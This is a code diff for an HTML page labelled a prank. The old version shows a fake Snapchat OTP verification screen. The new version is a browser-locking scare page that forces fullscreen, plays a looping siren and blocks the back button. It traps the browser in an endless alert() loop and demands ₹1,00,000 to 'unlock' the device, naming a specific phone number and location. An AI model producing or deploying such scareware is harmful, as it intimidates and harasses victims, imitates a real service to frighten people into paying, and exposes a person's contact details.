@@ -2,94 +2,80 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Snapchat Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>⚠️ System Alert</title>
   <style>
     html, body {
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      height: 100%;
-      overflow: hidden;
+      margin:0; padding:0; height:100%;
+      background:black; color:red;
+      font-family: monospace;
+      text-align:center;
+      overflow:hidden; user-select:none;
+    }
+    #overlay {
+      position:fixed; top:0; left:0; right:0; bottom:0;
+      background:black; color:red;
+      display:flex; justify-content:center; align-items:center;
+      font-size:2rem; cursor:pointer; z-index:9999;
     }
     .container {
-      text-align: center;
-      padding-top: 10%;
+      padding:10vh 5vw;
+      display:none; flex-direction:column;
+      justify-content:center; height:100%;
     }
-    h1 {
-      color: #ff3b30;
-    }
-    .otp-box {
-      margin-top: 30px;
-    }
-    input[type="text"] {
-      padding: 10px;
-      font-size: 18px;
-      width: 200px;
-      text-align: center;
-      border: none;
-      border-radius: 5px;
-    }
-    button {
-      margin-top: 15px;
-      padding: 10px 20px;
-      font-size: 18px;
-      background-color: #ff3b30;
-      border: none;
-      border-radius: 5px;
-      color: white;
-      cursor: pointer;
-    }
-    .warning {
-      margin-top: 40px;
-      font-size: 18px;
-      color: #f0c000;
+    h1 { font-size:2.5rem; margin-bottom:1rem; animation: blink 1s infinite; }
+    p { font-size:1.3rem; margin:0.7rem 0; }
+    .warning { font-size:1.6rem; margin-top:3rem; font-weight:bold; }
+    @keyframes blink {
+      0%, 100% { color:red; }
+      50% { color:white; }
     }
   </style>
 </head>
-<body onload="triggerPrank();">
-  <div class="container">
-    <h1>Snapchat Verification Alert</h1>
-    <p>This device has been temporarily locked.</p>
-    <p>Suspicious login attempt detected from: <strong>Kolhapur</strong></p>
-    <p>An OTP has been sent to: <strong>+91-8669607679</strong></p>
-
-    <div class="otp-box">
-      <input type="text" id="otpInput" placeholder="Enter OTP" maxlength="6" />
-      <br />
-      <button onclick="fakeVerify()">Verify</button>
-    </div>
-
-    <div class="warning" id="warningBox"></div>
+<body>
+  <div id="overlay">⚠️ Click anywhere to continue ⚠️</div>
+  <div class="container" id="prank-content">
+    <h1>⚠️ YOUR DEVICE HAS BEEN LOCKED ⚠️</h1>
+    <p>Snap Security detected:</p>
+    <p><strong>Location leaked:</strong> Kolhapur, MH</p>
+    <p><strong>Phone no. exposed:</strong> 8669607679</p>
+    <p><strong>IP traced</strong></p>
+    <p class="warning">
+      Send ₹1,00,000 to unlock.<br/>
+      Otherwise, Snapchat account & phone access will be wiped.
+    </p>
   </div>
-
-  <audio autoplay loop>
-    <source src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" type="audio/ogg">
-  </audio>
+  <audio id="siren" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" loop></audio>
 
   <script>
-    function triggerPrank() {
-      // Try to enter fullscreen
+    const overlay = document.getElementById('overlay');
+    const prankContent = document.getElementById('prank-content');
+    const siren = document.getElementById('siren');
+
+    function goFullscreen() {
       const el = document.documentElement;
       if (el.requestFullscreen) el.requestFullscreen();
       else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
       else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    }
 
-      // Disable back navigation
+    function startPrank() {
+      overlay.style.display = 'none';
+      prankContent.style.display = 'flex';
+      goFullscreen();
+      siren.play();
+
       history.pushState(null, null, location.href);
-      window.onpopstate = () => {
-        history.go(1);
-      };
+      window.onpopstate = () => history.go(1);
+
+      setTimeout(() => {
+        while (true) {
+          alert("⚠️ SECURITY ALERT\nSnapchat breach detected.\nYour session is locked.\nRestart Chrome to fix.");
+        }
+      }, 1500);
     }
 
-    function fakeVerify() {
-      const box = document.getElementById("warningBox");
-      box.innerText = "❌ Invalid OTP. Your location and number are being logged...";
-      setTimeout(() => {
-        alert("⚠️ Data sync failed. You must restart your phone to exit secure mode.");
-      }, 2000);
-    }
+    overlay.addEventListener('click', startPrank);
   </script>
 </body>
 </html>
